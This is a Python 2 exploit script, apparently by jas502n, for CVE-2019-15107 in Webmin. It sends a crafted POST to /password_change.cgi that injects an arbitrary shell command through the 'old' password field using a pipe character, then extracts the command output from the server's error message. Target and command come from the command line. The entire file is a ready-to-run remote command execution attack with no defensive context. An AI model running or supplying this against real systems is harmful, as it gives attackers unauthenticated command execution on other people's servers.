import requests
import re
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import sys


banner ='''
 _______           _______       _______  _______  __     _____       __    _______  __    _______  ______  
(  ____ \|\     /|(  ____ \     / ___   )(  __   )/  \   / ___ \     /  \  (  ____ \/  \  (  __   )/ ___  \ 
| (    \/| )   ( || (    \/     \/   )  || (  )  |\/) ) ( (   ) )    \/) ) | (    \/\/) ) | (  )  |\/   )  )
| |      | |   | || (__             /   )| | /   |  | | ( (___) |      | | | (____    | | | | /   |    /  / 
| |      ( (   ) )|  __)          _/   / | (/ /) |  | |  \____  |      | | (_____ \   | | | (/ /) |   /  /  
| |       \ \_/ / | (            /   _/  |   / | |  | |       ) |      | |       ) )  | | |   / | |  /  /   
| (____/\  \   /  | (____/\     (   (__/\|  (__) |__) (_/\____) )    __) (_/\____) )__) (_|  (__) | /  /    
(_______/   \_/   (_______/_____\_______/(_______)\____/\______/_____\____/\______/ \____/(_______) \_/     
                          (_____)                              (_____)                                      
                                     python By jas502n

'''
print banner

def CVE_2019_15107(url, cmd):
    vuln_url = url + "/password_change.cgi"
    headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "%s/session_login.cgi"%url,
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    } 
    payload="user=rootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2" % cmd
    r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
    if r.status_code ==200 and "The current password is " in r.content : 
        print "\nvuln_url= %s" % vuln_url
        m = re.compile(r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>", re.DOTALL)
        cmd_result = m.findall(r.content)[0]
        print
        print "Command Result = %s" % cmd_result
    else:
        print "No Vuln Exit!"


if __name__ == "__main__":
    # url = "https://10.10.20.166:10000"
    url = sys.argv[1]
    cmd = sys.argv[2]
    CVE_2019_15107(url, cmd)